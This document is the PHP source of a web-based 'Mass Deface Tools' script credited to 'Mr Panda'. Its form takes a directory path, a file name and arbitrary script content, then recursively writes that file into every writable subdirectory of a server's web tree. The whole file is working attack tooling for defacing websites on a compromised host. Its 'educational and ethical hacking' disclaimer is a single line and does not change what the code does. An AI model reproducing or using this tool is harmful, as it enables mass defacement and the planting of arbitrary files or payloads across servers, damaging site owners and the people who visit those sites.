<?php
###############################################################################
// Coded: Mr Panda 
// https://mrpanda.idandbeyond.co/
###############################################################################
function NF($f,$sc){
$fp2 = fopen($f,"w");
fputs($fp2,$sc);
}
function OD($gcwd){
	if(is_writable($gcwd)){
	$FN = $_POST['nama'];
	$sc = $_POST['script'];
	$a = scandir("$gcwd");
foreach($a as $A2){
	if($A2 == "." | $A2 == ".."){
	}elseif(is_dir("$gcwd/$A2")){
       $ND = "$gcwd/$A2";
		if(is_writable($ND)){
		echo "<style>body{background-color:black;}</style><font color=blue>$ND/$FN <font color=lime><-- Berjaya !<br>";
		$cf = NF("$ND/$FN", "$sc");
		$B = OD($ND);
 }
else{
	echo "Dir not Writeable";
	}
}
}	
}
else{
	echo "Dir not Writeable";
}
}
if($_POST){
$C = $_POST['dir'];
$Y = OD($C);
echo $Y;
}
else{
	echo '<html>
<head>
<title>-= Mass Deface Tools =-</title>
</head>
<body style="background-color:black;">
	<br>
		<center>
<img src="https://i.ibb.co/zbRHwjJ/mrpanda.jpg" width="30%">
</center>
<center><h2><font color=red>MASS DEFACE TOOLS</font></h2></center>
<p>
<center><font color=white>
	This project was created for educational and ethical hacking purposes. <br>
It should not be used in environments without legal authorization.</font>
<table><br><br><br><br><font color="yellow" size="2">Path Now<br>'.getcwd().'</font>
<tr><td><form method="post" action="?action"></td></tr>
<tr><td><input class="sd" type="text" name="dir" placeholder="/home/user/public_html/"></td> </tr>
<tr><td><input class="sd" type="text" name="nama" placeholder="mrpanda.html"></td> </tr>
<tr><td><br><textarea class="sd" rows="20" cols="70px" name="script" placeholder="Your Script"></textarea></td></tr>
<br><tr><td><br><input class="send" type="submit" value="Submit"></td></tr>
</form>
</table>';
echo"<br><font color=white>Coded By  Mr Panda</a></font></center>";

}
?>
